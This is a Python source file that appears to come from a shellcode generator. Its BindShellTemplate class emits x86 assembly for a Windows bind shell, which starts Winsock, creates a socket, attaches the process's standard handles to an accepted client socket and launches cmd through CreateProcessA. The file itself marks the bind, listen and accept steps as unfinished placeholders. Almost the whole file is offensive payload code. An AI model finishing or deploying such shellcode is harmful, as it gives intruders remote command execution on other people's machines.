"""Bind shell payload template scaffold.

Requires: WSAStartup, WSASocketA, LoadLibraryA, CreateProcessA
Variables: socket_handle, bind_socket
Strings: cmd (mov method)

NOTE: This is a scaffold. bind/listen/accept calls are placeholders.
"""
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig


class BindShellTemplate(PayloadTemplate):
    REQUIRED_FUNCTIONS = (
        "LoadLibraryA",
        "WSAStartup",
        "WSASocketA",
        "CreateProcessA",
    )
    REQUIRED_VARIABLES = ("socket_handle", "bind_socket")

    def emit(self, layout, config: TemplateConfig) -> str:
        wsa_start = layout.slot("WSAStartup").ebp_ref
        wsa_sock  = layout.slot("WSASocketA").ebp_ref
        cpa       = layout.slot("CreateProcessA").ebp_ref
        sock_h    = layout.slot("socket_handle").ebp_ref
        bind_s    = layout.slot("bind_socket").ebp_ref
        wsadata   = layout.slot("WSADATA").ebp_ref
        si        = layout.slot("STARTUPINFOA").ebp_ref
        pi        = layout.slot("PROCESS_INFORMATION").ebp_ref
        cmd       = layout.slot("cmd").ebp_ref

        return "\n".join([
            "; ── Bind Shell Payload (scaffold) ──────────────────────────────────",
            f"; Listen port: {config.lport}",
            "; NOTE: bind/listen/accept stubs are not generated — add manually.",
            "",
            "    ; WSAStartup(0x0202, &WSADATA)",
            f"    lea  esi, {wsadata}",
            "    push esi",
            "    push 0x0202",
            f"    call dword ptr {wsa_start}",
            "",
            "    ; WSASocketA — create bind socket",
            "    xor  eax, eax",
            "    push eax",
            "    push eax",
            "    push eax",
            "    mov  al, 0x6",
            "    push eax",
            "    sub  al, 0x5",
            "    push eax",
            "    inc  eax",
            "    push eax",
            f"    call dword ptr {wsa_sock}",
            f"    mov  {bind_s}, eax         ; save bind socket",
            "",
            "    ; TODO: bind(bind_socket, &sockaddr, 0x10)",
            "    ; TODO: listen(bind_socket, 0)",
            "    ; TODO: accept(bind_socket, NULL, NULL) -> socket_handle",
            f"    ; After accept: store client socket in {sock_h}",
            "",
            "    ; Set STARTUPINFOA stdio handles to accepted client socket",
            f"    mov  eax, {sock_h}",
            f"    lea  edi, {si}",
            "    mov  [edi+0x38], eax",
            "    mov  [edi+0x3c], eax",
            "    mov  [edi+0x40], eax",
            "",
            "    ; CreateProcessA",
            f"    lea  esi, {cmd}",
            f"    lea  edi, {si}",
            f"    lea  ebx, {pi}",
            "    xor  eax, eax",
            "    push ebx",
            "    push edi",
            "    push eax",
            "    push eax",
            "    push eax",
            "    inc  eax",
            "    push eax",
            "    xor  eax, eax",
            "    push eax",
            "    push eax",
            "    push esi",
            "    push eax",
            f"    call dword ptr {cpa}",
            "",
        ])
